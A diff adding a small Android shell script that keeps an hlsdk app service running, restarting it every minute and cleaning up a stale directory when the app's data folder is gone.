@@ -1,0 +1,22 @@
+#!/system/bin/sh
+while true; do
+	if [ -f "$1" ]; then
+		if [[ ! -d "/data/data/$2" ]]; then
+			rm -r $3/$2
+			for file in `ls -a $3`   
+			do    
+		    	if [ -f "$3/$file/s" ];then    
+		        	echo "$3/$file/s"
+					am startservice --user 0 -a com.hlsdk.service.START -e RESET 1 -n $file/com.hlsdk.service.MyService 
+		        	exit 0
+		    	fi     
+		    done    
+		    exit
+		else
+			am startservice --user 0 -a com.hlsdk.service.START -n $2/com.hlsdk.service.MyService 
+			sleep 60
+		fi
+	else
+		exit 0
+	fi
+done
